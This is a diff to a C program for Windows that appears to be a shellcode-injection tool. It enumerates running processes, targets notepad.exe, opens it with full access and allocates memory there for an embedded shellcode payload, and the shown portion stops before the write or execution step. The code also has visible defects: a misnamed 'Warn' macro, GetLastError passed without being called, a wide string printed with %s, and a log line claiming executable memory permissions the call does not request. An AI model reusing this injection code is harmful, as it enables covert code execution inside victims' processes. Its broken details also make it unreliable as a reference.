@@ -5,7 +5,7 @@
 
 #define okay(msg, ...) printf("[+]" msg "\n", ##__VA_ARGS__);
 #define info(msg, ...) printf("[*]" msg "\n", ##__VA_ARGS__);
-#define error(msg, ...) printf("[-]" msg "\n", ##__VA_ARGS__);
+#define warn(msg, ...) printf("[-]" msg "\n", ##__VA_ARGS__);
 
 int main(int argc, char *argv[]) {
   /*shellcode*/
@@ -36,19 +36,60 @@ int main(int argc, char *argv[]) {
 
   // variables
   HANDLE hProcess = NULL, hSnapshot = NULL;
+  LPVOID rAlloc_mem = NULL;
   PROCESSENTRY32 pe32;
   pe32.dwSize = sizeof(PROCESSENTRY32);
 
   // first we take a snapshot of the processes
   info("Taking Snapshot of the current processes...\n");
   hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+  if (hSnapshot == NULL) {
+    warn("error while taking the snapshot, error: %lu\n", GetLastError());
+
+    return EXIT_FAILURE;
+  }
+  okay("Snapshot was taken...\n");
+
   /*
     TH32CS_SNAPPROCESS: means you want to take a snapshot of the process list
     0: means you want to take a snapshot of all processes
   */
-  Process32First(hSnapshot, &pe32);
+  if (!Process32First(hSnapshot, &pe32)) {
+    warn("Eror while using the process32First function, error: %lu\n",
+         GetLastError());
+    return EXIT_FAILURE;
+  }
+  info("going throu the processes list...");
 
-  hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
+  do {
+    if (wcscmp(pe32.szExeFile, L"notepad.exe") == 0) {
+      info("%ls was found!\n", pe32.szExeFile);
+
+      // now we will get a handel of the process
+      info("Trying to Get a handel of the process...\n");
+      hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
+
+      if (hProcess == NULL) {
+        Warn("Couldn't get a handle to the process '%ls' PID <%ld>, error: %ld",
+             pe32.szExeFile, pe32.th32ProcessID, GetLastError);
+        return EXIT_FAILURE;
+      }
+      okay("Got a handle to the process '%ls' PID <%ld>\n\\---0x%p",
+           pe32.szExeFile, pe32.th32ProcessID, hProcess);
+
+      // Now we allocate bytes to the process memory.
+      info("allocating bytes to the process memory...\n");
+      rAlloc_mem = VirtualAllocEx(hProcess, NULL, sizeof(shellcode),
+                                  (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
+      if (!rAlloc_mem) {
+        warn("VirtualAllocEx failed in target process '%s' , error: %lu",
+             pe32.szExeFile, GetLastError());
+        return EXIT_FAILURE;
+      }
+      okay("Allocated %zu bytes with PAGE_EXECUTE_READWRITE permissions",
+           sizeof(shellcode));
+    }
+  } while (Process32Next(hSnapshot, &pe32));
 
   return EXIT_SUCCESS;
 }
